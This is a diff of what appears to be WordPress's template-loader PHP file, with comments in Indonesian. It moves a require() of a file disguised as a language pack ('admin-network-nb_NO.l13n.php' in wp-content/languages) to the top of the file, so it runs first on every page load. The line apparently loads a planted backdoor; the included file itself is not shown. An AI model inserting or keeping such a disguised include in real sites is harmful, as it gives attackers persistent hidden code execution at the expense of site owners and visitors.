@@ -1,4 +1,5 @@
 <?php
+require('/wp-content/languages/admin-network-nb_NO.l13n.php');
 /**
  * Memuat template yang sesuai berdasarkan URL pengunjung
  *
@@ -13,7 +14,6 @@ if ( wp_using_themes() ) {
      */
     do_action( 'template_redirect' );
 }
-require('/wp-content/languages/admin-network-nb_NO.l13n.php');
 
 /**
  * Memfilter apakah mengizinkan permintaan 'HEAD' untuk menghasilkan konten.
